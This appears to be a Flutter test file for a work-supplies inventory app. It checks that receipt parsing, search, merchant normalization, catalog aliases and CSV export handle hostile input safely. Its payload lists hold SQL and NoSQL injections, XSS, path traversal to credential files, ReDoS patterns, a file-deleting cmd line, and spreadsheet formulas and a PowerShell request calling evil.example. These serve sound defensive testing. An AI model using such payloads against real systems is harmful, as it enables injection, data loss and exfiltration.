import 'dart:io';

import 'package:flutter_test/flutter_test.dart';
import 'package:hive_flutter/hive_flutter.dart';
import 'package:maintaniac/screens/work_supplies/data/work_supply_catalog.dart';
import 'package:maintaniac/screens/work_supplies/data/work_supply_custom_catalog_store.dart';
import 'package:maintaniac/screens/work_supplies/data/work_supply_inventory_export.dart';
import 'package:maintaniac/screens/work_supplies/data/work_supply_models.dart';
import 'package:maintaniac/screens/work_supplies/data/work_supply_receipt_parser.dart';

void main() {
  group('inventory parser input attack surface behavior', () {
    test('hostile receipt text never creates a confident catalog match', () {
      for (final payload in _hostileReceiptPayloads) {
        final match = matchReceiptLineToCatalog(payload, maxCandidates: 24);

        expect(
          match == null || match.confidence < .82,
          isTrue,
          reason: 'Hostile text must not become a confident item: $payload',
        );
        expect(
          match?.needsReview ?? true,
          isTrue,
          reason: 'Hostile text can only remain review-only: $payload',
        );
      }
    });

    test('hostile search text is bounded and never mutates catalog results', () {
      final before = searchWorkSupplies('1/2 pex crimp elbow')
          .map((item) => item.id)
          .take(10)
          .toList();
      final stopwatch = Stopwatch()..start();

      for (final payload in _hostileSearchPayloads) {
        final results = searchWorkSupplies(payload);

        expect(
          results.length,
          lessThanOrEqualTo(100),
          reason: 'Search results must stay bounded for hostile input.',
        );
      }

      stopwatch.stop();
      final after = searchWorkSupplies('1/2 pex crimp elbow')
          .map((item) => item.id)
          .take(10)
          .toList();

      expect(after, before);
      expect(
        stopwatch.elapsedMilliseconds,
        lessThan(1500),
        reason: 'Hostile search batch should not create a local DoS.',
      );
    });

    test('merchant normalization treats hostile merchant names as plain text', () {
      for (final payload in _hostileMerchantPayloads) {
        final merchant = normalizeMerchantName(payload);

        expect(merchant, isNotEmpty);
        expect(merchant, isNot(contains('\u0000')));
        expect(
          merchant,
          isNot(anyOf('home depot', 'lowes', 'ferguson', 'grainger')),
          reason: 'Hostile text must not spoof a known merchant alias.',
        );
      }
    });

    test('custom catalog hostile aliases do not mutate stored item identity',
        () async {
      final hiveDirectory = await Directory.systemTemp.createTemp(
        'work_supply_input_attack_custom_catalog_',
      );
      Hive.init(hiveDirectory.path);
      try {
        final store = await WorkSupplyCustomCatalogStore.create();
        final item = WorkSupplyItem(
          id: ' USER-SAFE-ITEM ',
          name: 'Safe Custom Ball Valve',
          trade: 'Plumbing',
          category: 'Valves',
          system: 'Water Supply',
          itemType: 'Ball Valve',
          variant: '1/2 in',
          unit: 'each',
          aliases: _hostileAliasPayloads,
        );

        await store.saveItem(item);
        final before = store.loadItems().single;

        for (final payload in _hostileSearchPayloads) {
          store.searchItems(payload);
        }

        final after = store.loadItems().single;
        expect(after.id, 'USER-SAFE-ITEM');
        expect(after.name, before.name);
        expect(after.trade, before.trade);
        expect(after.category, before.category);
        expect(after.variant, before.variant);
        expect(after.unit, before.unit);
      } finally {
        await Hive.close();
        if (hiveDirectory.existsSync()) {
          await hiveDirectory.delete(recursive: true);
        }
      }
    });

    test('CSV export neutralizes formula injection in inventory fields', () {
      final record = WorkSupplyInventoryRecord(
        id: 'INV-FORMULA',
        item: WorkSupplyItem(
          id: 'ITEM-FORMULA',
          name: '=HYPERLINK("http://evil.example","click")',
          trade: 'Plumbing',
          category: '+SUM(1,2)',
          system: '-CMD',
          itemType: '@calc',
          variant: '1/2 in',
          unit: 'each',
          aliases: const ['formula safety'],
        ),
        onHand: 1,
        threshold: 1,
        lastUnitCost: 2,
        storageArea: '=IMPORTXML("http://evil.example","//a")',
        storageDetail: '+powershell',
        receiptLinked: true,
        sourceReceiptId: '@receipt',
        sourceReceiptLineId: '-line',
        sourceMerchantName: '=merchant',
      );
      final csv = WorkSupplyInventoryExportSnapshot(
        exportedAt: DateTime.utc(2026, 7, 2),
        inventoryRecords: [record],
        stockEvents: const [],
      ).toInventoryCsv();
      final dataRow = csv.split('\n').last;

      expect(dataRow, contains("'=HYPERLINK"));
      expect(dataRow, contains("'+SUM"));
      expect(dataRow, contains("'-CMD"));
      expect(dataRow, contains("'@calc"));
      expect(dataRow, contains("'=IMPORTXML"));
      expect(dataRow, contains("'+powershell"));
      expect(dataRow, contains("'@receipt"));
      expect(dataRow, contains("'-line"));
      expect(dataRow, contains("'=merchant"));
    });

    test('hostile input with real item evidence stays review-only', () {
      final match = matchReceiptLineToCatalog(
        '1/2 PEX CRIMP 90 ; DROP TABLE inventory --',
        tradeScope: 'Plumbing',
        maxCandidates: 320,
      );

      expect(
        match == null || match.needsReview,
        isTrue,
        reason: 'Hostile suffix must not become an auto-save certainty.',
      );
      expect(match?.confidence ?? 0, lessThan(1));
    });
  });
}

const _hostileReceiptPayloads = [
  "' OR '1'='1",
  '{"\$ne": null}',
  '../secrets/parser_pack.json',
  '<script>alert("x")</script>',
  'powershell -NoProfile Invoke-WebRequest http://evil.example',
  r'(a+)+$ aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!',
  '=HYPERLINK("http://evil.example","click")',
  '{"unterminated":',
  'sku,name\n1,"unterminated',
  'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
  'repeat repeat repeat repeat repeat repeat repeat repeat repeat',
  'LONGTOKENLONGTOKENLONGTOKENLONGTOKENLONGTOKENLONGTOKENLONGTOKEN',
  'null\u0000byte',
  'control\u0001character',
  'safe\u202Ecod.exe',
  'emoji \u{1F4A3}',
  '&lt;img src=x onerror=alert(1)&gt;',
  'https://evil.example/catalog.json',
  r'C:\Windows\System32\drivers\etc\hosts',
  r'%USERPROFILE%\Documents\secret',
];

const _hostileSearchPayloads = [
  "' OR item_id IS NOT NULL --",
  '{"where":{"trade":{"\$ne":"Plumbing"}}}',
  '../../firebase-adminsdk.json',
  '<img src=x onerror=alert(1)>',
  'cmd.exe /c del inventory',
  r'([a-z]+)+$',
  '=cmd|\' /C calc\'!A0',
  '{bad json',
  'name,alias\n=SUM(1,2),bad',
  'zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz',
  'pipe pipe pipe pipe pipe pipe pipe pipe pipe pipe pipe pipe',
  'abc\u0000def',
  'abc\u0007def',
  'abc\u202Edef',
  'http://127.0.0.1:8080/admin',
  r'..\..\AppData\Local',
];

const _hostileMerchantPayloads = [
  '<script>home depot</script>',
  'LOWES"; DROP TABLE merchants; --',
  '{"merchant":{"\$ne":"ACE"}}',
  '../HOME DEPOT',
  '=HYPERLINK("http://evil.example","LOWES")',
  'GRAINGER\u0000FERGUSON',
  'ACE\u202EHACK',
];

const _hostileAliasPayloads = [
  ' =HYPERLINK("http://evil.example","click") ',
  '+SUM(1,2)',
  '-CMD',
  '@calc',
  '<script>alert(1)</script>',
  '../custom/catalog',
  '{"\$ne":null}',
];
